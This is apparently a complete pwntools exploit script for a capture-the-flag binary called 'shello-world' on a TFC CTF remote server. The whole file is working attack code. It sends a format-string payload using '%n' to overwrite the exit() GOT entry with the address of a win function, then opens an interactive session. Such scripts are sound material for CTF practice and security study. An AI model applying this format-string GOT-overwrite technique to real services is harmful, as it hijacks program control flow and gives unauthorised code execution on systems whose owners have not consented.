#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("shello-world")

local = False 
if local:
    p = process("./shello-world")
    gdb.attach(p,'''b*0x000000000040130c\nc''')
else:
    p = remote('challs.tfcctf.com', 30784)

elf = context.binary = ELF('./shello-world', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
win = 0x401176
exit_got = 0x404028
payload = b'%' + str(win).encode() + b'c%8$n   ' + p64(exit_got)

sl(payload)


p.interactive()